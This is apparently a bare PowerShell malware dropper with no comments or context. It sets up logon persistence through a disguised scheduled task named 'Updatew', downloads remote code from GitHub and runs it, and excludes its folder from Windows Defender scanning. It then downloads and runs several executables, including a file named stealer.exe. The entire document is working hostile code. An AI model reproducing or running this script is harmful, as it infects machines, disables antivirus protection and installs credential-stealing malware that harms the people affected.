$dir = "$env:userprofile\150F4013"
New-Item -ItemType Directory -Path $dir

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$dir\run.cmd" /RL HIGHEST /F


iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)


$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp
Add-MpPreference -ExclusionPath $dir




Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}

$file = "$temp\runfirst1.txt"

if (-not (Test-Path $file)) {
    New-Item -Path $file -ItemType File
    Start-Process "https://mybiolinks.io/cDjYO"
    
    Invoke-WebRequest -Uri "https://anonsharing.com/file/8f56ab5e1816f025/stealera.exe" -OutFile "$temp\stealer.exe"
    Start-Process -FilePath "$temp\stealer.exe"
}
